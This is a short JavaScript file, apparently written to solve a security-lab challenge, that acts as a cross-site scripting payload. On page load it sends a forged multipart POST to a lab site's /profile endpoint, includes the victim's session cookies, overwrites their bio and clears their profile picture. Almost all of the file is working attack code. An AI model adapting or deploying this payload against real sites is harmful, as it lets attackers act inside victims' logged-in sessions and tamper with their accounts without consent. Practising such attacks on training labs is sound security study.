// xss-script.js
window.addEventListener('load', function() {
    // Crear el boundary (puede ser cualquier string único)
    const boundary = '---------------------------' + Date.now() + Math.random().toString(36).substring(2);
    
    // Construir el cuerpo multipart/form-data
    const bodyParts = [
        `--${boundary}`,
        'Content-Disposition: form-data; name="bio"',
        '',
        'XSS funciono el xss',
        `--${boundary}`,
        'Content-Disposition: form-data; name="profile_pic"; filename=""',
        'Content-Type: application/octet-stream',
        '',
        '',
        `--${boundary}--`,
        ''
    ];

    const body = bodyParts.join('\r\n');

    // Hacer la petición POST a /profile
    fetch('https://chl-60c90126-7eb6-4091-9a75-f3f19ec79c09-blog-hacklab-v2.softwareseguro.com.ar/profile', {
        method: 'POST',
        headers: {
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Origin': 'https://chl-60c90126-7eb6-4091-9a75-f3f19ec79c09-blog-hacklab-v2.softwareseguro.com.ar',
            'Referer': 'https://chl-60c90126-7eb6-4091-9a75-f3f19ec79c09-blog-hacklab-v2.softwareseguro.com.ar/profile',
            'Upgrade-Insecure-Requests': '1'
        },
        credentials: 'include', // Esto incluye automáticamente las cookies de sesión
        body: body
    })
    .then(response => {
        console.log('✅ Petición POST enviada. Status:', response.status);
        // Si hay redirección, seguirla
        if (response.redirected) {
            window.location.href = response.url;
        }
        return response.text();
    })
    .then(data => {
        console.log('📝 Respuesta recibida del servidor');
        // Opcional: mostrar mensaje de éxito
        alert('XSS ejecutado correctamente');
    })
    .catch(error => {
        console.log('❌ Error:', error);
    });
});